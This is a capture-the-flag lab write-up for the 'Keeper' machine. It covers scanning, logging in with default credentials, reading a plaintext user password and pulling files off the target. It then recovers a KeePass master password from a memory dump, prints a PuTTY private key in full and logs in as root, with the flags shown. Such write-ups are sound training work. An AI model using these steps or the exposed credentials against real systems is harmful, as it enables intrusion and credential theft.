## Nmap Scan

I do a `nmap scan`:
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A 10.10.11.227 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 14:30 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.45% done; ETC: 14:30 (0:00:40 remaining)
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 33.60% done; ETC: 14:30 (0:00:08 remaining)
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 14:30 (0:00:06 remaining)
Nmap scan report for 10.10.11.227
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.33 seconds

```

I see the Web Page that redirect me in this link  `http://tickets.keeper.htb/rt/`, thereby I edit this file `/etc/hosts` in this way:
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                       
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.227    tickets.keeper.htb
```


## Web Enumeration

I see a Login page, and I search it in Google for `Default Creds` for Request Tracker and i discover this credentials: 
```
root:password
```

I do a bit of enumeration in the site and I discover this directory `http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27`, here I discover the user credentials:
```
lnorgaard:Welcome2023!
```

I login to ssh like lnorgaard and I find the userflag:
```
┌──(kali㉿kali)-[~]
└─$ ssh lnorgaard@10.10.11.227
lnorgaard@10.10.11.227's password: 
Permission denied, please try again.
lnorgaard@10.10.11.227's password: 
Permission denied, please try again.
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have mail.
Last login: Tue Aug 22 21:32:33 2023 from 10.10.14.112
lnorgaard@keeper:~$ cat user.txt
048449a30142bac10a23b899f4c5dac9
lnorgaard@keeper:~$ 
```

## Privilege Escalation

I see all file in the user directory and I unzip a file:
```sh
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
lnorgaard@keeper:~$ unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx          
lnorgaard@keeper:~$ ls
KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip  user.txt
lnorgaard@keeper:~$ 
```

I download this files in my Local Machine:

- I open a WebServer  on the Target Machine:
```sh
lnorgaard@keeper:~$ python3 -m http.server 4444 
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

- I download the file to the Local Machine:
```sh
┌──(kali㉿kali)-[~]
└─$ curl http://keeper.htb:4444/KeePassDumpFull.dmp -O KeePassDumpFull.dmp    
...

┌──(kali㉿kali)-[~]
└─$ curl http://keeper.htb:4444/passcodes.kdbx -O passcodes.kdbx 
...
```

Now I use this POC to retrieve the master password of a **keepass** database, the repository is `https://github.com/CMEPW/keepass-dump-masterkey`, I run the python script:
```sh
┌──(kali㉿kali)-[~/keeper.htb]
└─$ python3 poc.py -d KeePassDumpFull.dmp
2023-08-23 13:28:43,340 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

I search `●,dgr●d med fl●de` on google and I find a dessert name: `rødgrød med fløde`

I search on google`how open .kdbx file on linux` and I find a interesting tool `keepassx`, I download this tool:
```sh
┌──(kali㉿kali)-[~/keeper.htb]
└─$ sudo apt install keepassx
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
...

┌──(kali㉿kali)-[~/keeper.htb]
└─$ keepassxc --help
Usage: keepassxc [options] [filename(s)]
KeePassXC - cross-platform password manager

Options:
  -h, --help                   Displays help on commandline options.
  --help-all                   Displays help including Qt specific options.
  -v, --version                Displays version information.
  --config <config>            path to a custom config file
  --localconfig <localconfig>  path to a custom local config file
  --lock                       lock all open databases
  --keyfile <keyfile>          key file of the database
  --pw-stdin                   read password of the database from stdin
  --debug-info                 Displays debugging information.

Arguments:
  filename(s)                  filenames of the password databases to open
                               (*.kdbx)
```

I open the file (the password that I used it is `rødgrød med fløde` ):
```sh
┌──(kali㉿kali)-[~/keeper.htb]
└─$ keepassxc passcodes.kdbx
```

I can see `keeper.htb (Ticketing Server)`, I copy that Notes in a file:
```sh
┌──(kali㉿kali)-[~/keeper.htb]
└─$ nano Putty-User-Key-File.txt

┌──(kali㉿kali)-[~/keeper.htb]
└─$ cat Putty-User-Key-File.txt
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

I download `putty` to generate `id_rsa` with this file `Putty-User-Key-File.txt`:
```sh
┌──(kali㉿kali)-[~/keeper.htb]
└─$ sudo apt install putty-tools
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Suggested packages:
  putty-doc
The following NEW packages will be installed:
  putty-tools
0 upgraded, 1 newly installed, 0 to remove and 810 not upgraded.
Need to get 607 kB of archives.
After this operation, 3,664 kB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 putty-tools amd64 0.78-3 [607 kB]
Fetched 607 kB in 1s (839 kB/s)     
Selecting previously unselected package putty-tools.
(Reading database ... 417947 files and directories currently installed.)
Preparing to unpack .../putty-tools_0.78-3_amd64.deb ...
Unpacking putty-tools (0.78-3) ...
Setting up putty-tools (0.78-3) ...
Processing triggers for man-db (2.11.2-2) ...
Processing triggers for kali-menu (2023.3.1) ...
```

I generate the `id_rsa` in a specific format, and I change permissions :
```sh
┌──(kali㉿kali)-[~/keeper.htb]
└─$  puttygen Putty-User-Key-File.txt -O private-openssh -o id_rsa

┌──(kali㉿kali)-[~/keeper.htb]
└─$ chmod 600 id_rsa   
```

Now I login like root and I find the root flag:
```
┌──(kali㉿kali)-[~/keeper.htb]
└─$ ssh -i id_rsa  root@10.10.11.227
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# cat root.txt
ae8f1cc3dc9ace2a47f9c6d94a48ff7b
root@keeper:~# 
```






